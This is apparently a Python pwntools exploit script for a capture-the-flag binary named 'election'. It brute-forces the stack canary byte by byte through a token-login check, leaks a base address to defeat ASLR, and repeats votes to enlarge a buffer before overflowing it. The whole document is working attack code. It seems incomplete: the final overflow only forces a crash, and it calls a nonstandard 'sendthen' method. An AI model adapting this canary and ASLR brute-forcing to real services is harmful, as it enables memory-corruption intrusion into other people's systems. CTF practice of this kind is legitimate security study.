from pwn import *

context.clear(arch='x86_64')

r = process('./election')
# r = remote('', 10180)

# some token array
token = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'

# accumulate vote for enough space to write buffer
cnt = 0
def vote():
    # in voting function
    global cnt
    for do_vote in xrange(0, 10):
        r.sendlineafter('>', '1')
        r.sendlineafter('9]: ', '1')

        # Angelboy: Thank you!
        r.recvline()

    r.sendlineafter('>', '3')

# write buffer to leak canary info
def buf_canary():
    r.sendlineafter('>', '2')

    # The more votes.... say!
    r.sendlineafter('9]: ', '1')

    # try overwrite canary, msg[0xe0] and 8 bytes for 2 integers
    # To Angelboy:
    r.recv()
    r.sendline('A' * 0xe8 + 'B' * 8)

    # Done!

    # quit voting --> SIGABRT occurred
    r.sendlineafter('>', '3')
    print(r.recv())

def hack_canary_ASLR():
    canary = ''
    canary_offset = 0xb8
    guess = 0

    buf = ''
    buf += 'A' * canary_offset

    r.sendlineafter('>', '2')
    r.sendlineafter('token: ', buf)

    print('finished regiseter a token! ')
    while len(canary) < 8:
        while guess <= 0xff:

            r.sendlineafter('>', '1')
            r.sendthen('Token: ', buf + chr(guess))

            check = r.recvline()
            if 'Invalid' not in check:
                canary += chr(guess)
                buf += chr(guess)
                guess = 0

                # logout
                r.sendlineafter('>', '3')
                break

            guess += 1


    aslr = ''
    guess = 0

    print('canary --> ', hex(u64(canary)))
    while len(aslr) < 8:
        while guess <= 0xff:

            r.sendlineafter('>', '1')
            r.sendthen('Token: ', buf + chr(guess))

            check = r.recvline()
            if 'Invalid' not in check:
                aslr += chr(guess)
                buf += chr(guess)
                guess = 0

                # logout
                r.sendlineafter('>', '3')
                break

            guess += 1

    print('ASLR base --> ', hex(u64(aslr) - 0x1140))
    return u64(canary), u64(aslr)

def main():
    # brute force finding canary, and some ASLR-shit
    canary, aslr = hack_canary_ASLR()

    # vote for writing more buffer
    for token_cnt in xrange(0, 25):
        r.sendlineafter('>', '2')
        r.sendlineafter('token: ', token[token_cnt])
        r.sendlineafter('>', '1')
        r.sendlineafter('Token: ', token[token_cnt])
        vote()

    # check vote result
    r.sendlineafter('>', '2')
    r.sendlineafter('token: ', token[26])
    r.sendlineafter('>', '1')
    r.sendlineafter('Token: ', token[26])
    r.sendlineafter('>', '1')
    r.recv()
    print(r.recv())
    r.sendline('1')
    r.recvline()

    buf_canary()
    r.sendlineafter('>', '3')

main()
r.sendlineafter('>', '3')
print('final')
r.close()
